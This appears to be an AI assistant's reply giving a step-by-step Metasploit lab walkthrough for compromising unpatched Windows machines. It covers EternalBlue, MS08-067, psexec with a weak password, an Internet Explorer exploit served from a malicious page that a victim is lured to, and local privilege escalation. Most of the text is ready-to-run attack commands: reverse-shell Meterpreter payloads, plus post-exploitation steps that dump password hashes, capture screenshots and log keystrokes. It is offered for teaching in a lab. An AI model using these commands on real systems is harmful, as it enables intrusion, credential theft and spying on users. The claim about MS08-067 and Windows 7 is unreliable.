
1. **How EternalBlue works**
2. **How to exploit it in a lab**
3. **How to approach the other ones step-by-step**



## **1️⃣ MS17-010 – EternalBlue SMBv1 RCE**

**What it is:**

* SMB (Server Message Block) is a file-sharing protocol in Windows.
* In Windows 7 (and older systems), SMBv1 has a **buffer overflow vulnerability** that lets an attacker execute code remotely without authentication.
* Microsoft patched it in March 2017 — but many unpatched systems still exist in labs.
* Famously used in **WannaCry ransomware**.



### **Step-by-step Lab Example**

**Requirements:**

* Kali Linux attacker machine (Metasploit installed)
* Windows 7 SP1 (32-bit or 64-bit) **unpatched** with SMBv1 enabled (Host-Only Network in VirtualBox/VMware)



#### **1. Scan target with Nmap to check vulnerability**

```bash
nmap -p 445 --script smb-vuln-ms17-010 <target-ip>
```

* If it says **VULNERABLE**, you can proceed.



#### **2. Start Metasploit**

```bash
msfconsole
```



#### **3. Load the EternalBlue exploit**

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

---

#### **4. Set target IP**

```bash
set RHOSTS <target-ip>
```

---

#### **5. Choose payload**

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your-kali-ip>
```

---

#### **6. Exploit**

```bash
exploit
```

* If successful, you’ll get a **Meterpreter session** (remote shell).

---

#### **7. Post-exploitation fun** (For students to explore)

```bash
sysinfo         # Get system info
hashdump        # Dump password hashes
screenshot      # Capture desktop screenshot
keyscan_start   # Start keylogger
keyscan_dump    # Dump logged keystrokes
```

---

## **2️⃣ MS08-067 – NetAPI RCE**

**How it works:**

* Vulnerability in Windows Server service (`netapi32.dll`).
* Allows **unauthenticated remote code execution** via malformed RPC requests.
* Works well on older Windows 7 builds.

**Lab Steps:** (Almost same as above)

```bash
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <target-ip>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your-ip>
exploit
```

---

## **3️⃣ psexec SMB Admin Access**

**How it works:**

* Not a vulnerability — but if weak credentials are found, you can log in remotely and run code.
* Great for **lateral movement** exercises.

```bash
use exploit/windows/smb/psexec
set RHOSTS <target-ip>
set SMBUser administrator
set SMBPass 123456
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your-ip>
exploit
```

---

## **4️⃣ IE Browser Exploits**

**How it works:**

* Host a malicious webpage with Metasploit.
* Victim visits in IE 8/9 → exploit triggers.

Example:

```bash
use exploit/windows/browser/ie_execcommand_uaf
set SRVHOST <your-ip>
set URIPATH /
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your-ip>
exploit
```

Then, get victim to visit:
`http://<your-ip>/`

## **5️⃣ Local Privilege Escalation**

**How it works:**

* You already have a low-privilege account, and you exploit a kernel or service misconfiguration to become SYSTEM.

Example:

```bash
use exploit/windows/local/ms10_015_kitrap0d
set SESSION <session-id>
exploit
```

Do you want me to prepare that cheat sheet so your students can use it in class?
It would make their lab work much smoother.
